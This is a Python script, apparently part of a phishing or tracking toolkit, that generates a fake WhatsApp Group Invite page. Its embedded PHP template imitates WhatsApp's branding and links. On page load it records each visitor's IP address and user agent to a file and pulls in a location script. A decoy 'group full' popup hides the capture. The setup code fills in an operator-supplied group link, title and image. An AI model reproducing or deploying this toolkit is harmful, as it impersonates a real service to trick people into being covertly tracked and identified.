import datetime
import shutil
import sys
import random

class COLORS:
    cyan = '\033[96m'
    red = '\033[91m'
    white = '\033[0;97m'
    gray = '\033[90m'

def now():
    now = datetime.datetime.now().strftime("%H:%M:%S")
    return now

s1index = """<?php
function getip()
{
    $ip = null;
    if(isset($_SERVER))
    {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        elseif(isset($_SERVER['HTTP_CLIENT_IP']))
        {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
        else
        {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    }
    else
    {
        if(getenv('HTTP_X_FORWARDED_FOR'))
        {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
        }
        elseif(getenv('HTTP_CLIENT_IP'))
        {
            $ip = getenv('HTTP_CLIENT_IP');
        }
        else
        {
            $ip = getenv('REMOTE_ADDR');
        }
    }
    return $ip;
}
function getagent()
{ 
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    return $useragent;
}
$ip = getip();
$agent = getagent();
$out = array(
    'status' => 'ip_info',
    'ip' => $ip,
    'agent' => $agent
);
$jsondata = json_encode($out);
file_put_contents("files/info/out.txt", $jsondata);
?>
<html class="" id="facebook" lang="en">
    <head>
        <meta charset="utf-8"/>
        <meta content="origin-when-crossorigin" id="meta_referrer" name="referrer"/>
        <title id="pageTitle">WhatsApp Group Invite</title>
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
        <meta content="#1BA691" name="theme-color"/>
        <meta content="#1BA691" name="msapplication-navbutton-color"/>
        <meta content="yes" name="apple-mobile-web-app-capable"/>
        <meta content="$TITLE$" property="og:title"/>
        <meta content="https://i.imgur.com/lY6PFrr.png" property="og:image"/>
        <meta content="WhatsApp.com" property="og:site_name"/>
        <meta content="WhatsApp Group Invite" property="og:description"/>
        <meta content="WhatsApp Group Invite" property="description"/>
        <meta content="#1BA691" name="apple-mobile-web-app-status-bar-style"/>
        <meta content="yes" name="mobile-web-app-capable"/>
        <style>
            #hide_till_load{display: block !important;}
            .modal {
                display: none;
                width: 300px; 
                height: 100px;
                position: absolute;
                top: 25%;
                left: 50%;
                transform: translate(-50%, -75%);
                background-color: white;
                box-shadow: 0px 0px 25px 0px rgba(0,0,0,0.75);
                color: black;
                border-radius: 8px;
                text-align: center;
                font-size: 22px;
                font-weight: bold;
                padding: 20px !important;
            }
            .modal-footer {
                display: flex;
                justify-content: center;
            }
            .modal-button {
                position: absolute;
                bottom: 0;
                padding-bottom: 20px !important;
                color: #1ebea5;
                font-size: 22px;
                font-weight: bold;
                background-color: transparent;
                border: 0;
            }
        </style>
        <meta content="noindex" name="robots"/>

        <link href="/files/images/rYZqPCBaG70.png" rel="shortcut icon"/>
        <link href="/files/css/s9hWiNS5894.css" rel="stylesheet" type="text/css"/>
        <link href="/files/css/Epf3I8GM5jv.css" rel="stylesheet" type="text/css"/>
        <script type="text/javascript">
    	    if (window.location.protocol == "http:") {
        	    var restOfUrl = window.location.href.substr(5);
        	    window.location = "https:" + restOfUrl;
    	    }
        </script>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="/files/js/loc.js"></script>
    </head>

    <body class="_2yzz _2ywk _whatsapp_www__page--invite en gecko x1 Locale_en_GB" dir="ltr" onload="information();">
        <div class="_2ywh" id="hide_till_load" style="display: none">
            <div class="_2y_d _whatsapp_www__page--invite">
                <div class="_2zpg">
                    <header class="_2zpl">
                        <div class="_2yz3 _2ziw" id="header-inner">
                            <a class="_36or _2zq_" href="https://www.whatsapp.com/"></a>
                            <a class="_36or _2yzn" href="" rel="noopener">WhatsApp Group Invite</a>
                            <button aria-label="menu" class="_2zpw" id="icon-drawer-open">
                                <svg height="37" id="icon-menu" space="preserve" style="enable-background:new 0 0 37 37;" version="1.1" viewbox="0 0 37 37" width="37" x="0" xmlns="http://www.w3.org/1999/xlink" y="0">
                                    <path class="_2y-e" d="M8,26h21v-1.8H8V26z M8,11v1.8h21V11H8zM8,19.2h21v-1.8H8V19.2z"></path>
                                </svg>
                            </button>
                            <nav class="_2yzy">
                                <ul class="_2yyz">
                                    <li class="_2zw6"><a class="_36or" href="https://web.whatsapp.com/">WhatsApp Web</a></li>
                                    <span class="_2zwe"></span>
                                    <li class="_2zw6"><a class="_36or" href="https://www.whatsapp.com/features/">Features</a></li>
                                    <span class="_2zwe"></span>
                                    <li class="_2zw6"><a class="_36or" href="https://www.whatsapp.com/download/">Download</a></li>
                                    <span class="_2zwe"></span>
                                    <li class="_2zw6"><a class="_36or" href="https://www.whatsapp.com/security/">Security</a></li>
                                    <span class="_2zwe"></span>
                                    <li class="_2zw6"><a class="_36or" href="https://faq.whatsapp.com/">FAQ</a></li>
                                    <span class="_2zwe"></span>
                                </ul>
                            </nav>
                        </div>
                        <nav aria-hidden="true" class="_2zc-" id="menu-drawer">
                            <div class="_2zlb">
                                <button aria-label="close menu" class="_2zix" id="icon-drawer-close">
                                    <svg height="37" id="icon-close" space="preserve" style="enable-background:new 0 0 37 37;" version="1.1" viewbox="0 0 37 37" width="37" x="0" xmlns="http://www.w3.org/1999/xlink" y="0">
                                        <polygon class="_2y-e" points="26.7,11.6 25.4,10.3 18.5,17.2
                                            11.6,10.3 10.3,11.6 17.2,18.5
                                            10.3,25.4 11.6,26.7 18.5,19.8
                                            25.4,26.7 26.7,25.4 19.8,18.5 ">
                                        </polygon>
                                    </svg>
                                </button>
                                <div class="_2zlc"></div>
                                <ul class="_2z2n _2zo_">
                                    <li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/download/">Download</a></li>
                                    <li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/features/">Features</a></li>
                                    <li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/security/">Security</a></li>
                                    <li class="_2zp6"><a class="_36or _2zp7" href="https://faq.whatsapp.com/">FAQ</a></li>
                                    <li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/contact/">Get in touch</a></li>
                                    <li class="_2zp6 _2zp9"></li>
                                </ul>
                            </div>
                        </nav>
                    </header>
                </div>
                <div class="_2zry">
                    <div class="_2yzc">
                        <div class="_2yz5 _2yz8" id="main_block" style="display: block;">
                            <div class="_2yyk _8cis">
                                <a class="_36or _2y_6 _2z38" href="https://www.whatsapp.com/download" id="action-icon" title="Follow this link to join">
                                    <span class="_2z9j" style="background-image: url(/files/icons/$GICON$)"></span>
                                </a>
                                <h2 class="_2yzk">$GTITLE$</h2>
                                <h3 class="_8cit">WhatsApp Group Invite</h3>
                                <div class="_whatsapp_www__block_action">
                                    <a class="_36or _2y_c _2z0c _2z07" href="$GLINK$" title="Follow this link to join" id="action-button">Join Chat</a>
                                </div>
                            </div>
                            <hr/>
                            <div class="_6jg7">Don't have WhatsApp yet?
                                <br/>
                                <a class="_36or" href="https://www.whatsapp.com/download">Download</a>
                            </div>
                        </div>
                        <div class="_2yz5 _2yz8" id="fallback_block" style="display: none;">
                            <div class="_2yyk _8ibq">
                                <h2 class="_2yzk">Looks like you don't have WhatsApp installed!</h2>
                                <a class="_36or _2y_c _2z0c _2z07" href="https://www.whatsapp.com/download">Download</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="_6jg3">
                    <div class="_2y-f _2y-g">
                        <div class="_2yz1">
                            <div class="_2ywp">
                                <div class="_2yyk _2y-j _2yzj">
                                    <h4 class="_2yzk">WhatsApp</h4>
                                    <div class="_2y_4">
                                        <ul class="_2zne _2zoz">
                                            <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/features/">Features</a></li>
                                            <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/security/">Security</a></li>
                                            <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/download/">Download</a></li>
                                            <li class="_2znf"><a class="_36or _2zob" href="https://web.whatsapp.com/">WhatsApp Web</a></li>
                                            <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/business/">Business</a></li>
                                            <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/privacy">Privacy</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="_2yyk _2y-j _2yzj">
                                    <h4 class="_2yzk">Company</h4>
                                    <div class="_2y_4">
                                    <ul class="_2zne _2zoz">
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/about/">About</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/join/">Careers</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsappbrand.com/" rel="noopener" target="_blank">Brand Center</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/contact/">Get in touch</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://blog.whatsapp.com/">Blog</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/stories/">WhatsApp Stories</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="_2yyk _2y-j _2yzj">
                                <h4 class="_2yzk">Download</h4>
                                <div class="_2y_4">
                                    <ul class="_2zne _2zoz">
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/download/">Mac/PC</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/android/">Android</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/appstore/">iPhone</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="_2yyk _2y-j _2yzj">
                                <h4 class="_2yzk">Help</h4>
                                <div class="_2y_4">
                                    <ul class="_2zne _2zoz">
                                        <li class="_2znf"><a class="_36or _2zob" href="https://faq.whatsapp.com/">FAQ</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://twitter.com/whatsapp" rel="noopener" target="_blank">Twitter</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.facebook.com/WhatsApp" rel="noopener" target="_blank">Facebook</a></li>
                                        <li class="_2znf"><a class="_36or _2zob" href="https://www.whatsapp.com/coronavirus/">Coronavirus</a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="_2y-f _2y-h">
                    <div class="_2yz1">
                        <div class="_2ywp">
                            <div class="_2y-j" dir="auto">2020 © WhatsApp Inc.</div>
                            <div class="_2y-j _2y-k">
                                <a class="_36or _2y-i" href="https://www.whatsapp.com/legal/">Privacy &amp; Terms</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </div>
        <div></div>
        <style>
            
        </style>
        <div id="dialog" class="modal">
            <p>Maximum group capacity of 256 participants reached</p>
            <div class="modal-footer">
                <button class="modal-button" onclick="disap();">OK</button>
            </div>
        </div>
        <script>
            $("#dialog").hide();
            function popup(){
                    $("#dialog").fadeIn();
                }
            function disap(){
                $("#dialog").fadeOut();
            }
        </script>
    </body>
</html>"""

def s1file(gtitle,gicon,glink):
    print("")
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: Generating index.php file.")
    tempindex = s1index
    tempindex = tempindex.replace("$GTITLE$", gtitle)
    tempindex = tempindex.replace("$GICON$", gicon)
    tempindex = tempindex.replace("$GLINK$", glink)
    with open("site/index.php", "w") as index:
        index.write(tempindex)
    print(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.gray}INFO{COLORS.white}]: The index.php is Generated successfully.")

def s1setup():
    glink = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}GROUP LINK{COLORS.white}]> ")
    gtitle = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}GROUP TITLE{COLORS.white}]> ")
    gicon_ = input(f"[{COLORS.cyan}{now()}{COLORS.white}]-[{COLORS.red}GROUP IMAGE{COLORS.white}]> ").replace("\"","")
    giconext = gicon_.split('.')[-1]
    iconname= ""
    chars = "qwertyuiopasdfghjklzxcvbnm1234567890"
    for i in range(15):
        iconname += random.choice(chars)
    try:
        shutil.copyfile(gicon_,f"site/files/icons/{iconname}.{giconext}")
    except:
        sys.exit(f"[{COLORS.cyan}{now()}{COLORS.white}] {COLORS.red}Error File Not Found '{gicon_}'{COLORS.white}")
    gicon = iconname+"."+giconext
    s1file(gtitle,gicon,glink)